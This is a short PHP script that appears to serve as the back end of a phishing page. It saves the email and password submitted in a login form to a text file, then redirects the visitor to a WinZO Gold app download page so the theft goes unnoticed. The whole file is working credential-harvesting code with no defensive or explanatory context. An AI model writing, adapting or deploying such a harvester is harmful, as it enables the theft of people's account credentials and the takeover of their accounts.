<?php

file_put_contents("usernames.txt", " Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://winzo-gold.en.uptodown.com/android/download');
exit();
?>
